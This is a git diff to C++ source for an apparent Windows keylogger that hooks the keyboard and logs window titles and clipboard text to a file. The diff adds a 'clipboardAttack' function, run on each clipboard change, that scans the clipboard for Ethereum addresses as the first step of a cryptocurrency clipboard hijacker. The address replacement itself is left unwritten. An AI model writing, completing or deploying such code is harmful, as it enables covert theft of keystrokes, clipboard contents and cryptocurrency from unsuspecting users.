@@ -42,6 +42,8 @@ std::wstring getWindowTitle(){
 
 /* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */
 
+//FIX NON-TEXT errors
+
 std::wstring getClipboardText(){
 	if (OpenClipboard(NULL) == 0){
 		std::cout << "Error in openclipboard" << std::endl;
@@ -71,6 +73,19 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile << "' - ";
 	logfile << buf << std::endl;
 	logfile.close();
+}
+
+/* clipboardAttack() is an famous attack especially in the crypto space, it will scan your clipboard for an cryptocurrency address then changes */
+
+void clipboardAttack(){
+	std::wstring cbText = getClipboardText();
+	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42){
+		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
+		/*if (OpenClipboard(NULL) == 0){
+		std::cout << "Error in openclipboard" << std::endl;
+		}*/
+
+	}
 }
 
 /* writeClipboardChange() is called whenever the clipboard updates (ClipboardSequenceNumber is changed), it calls getClipboardText() then write it in log file */
@@ -190,6 +205,7 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 		std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
 		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
 			writeClipboardChange();
+			clipboardAttack();
 			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
 		}
 		// NEED TO FIX: first time program enters it prints 1 char
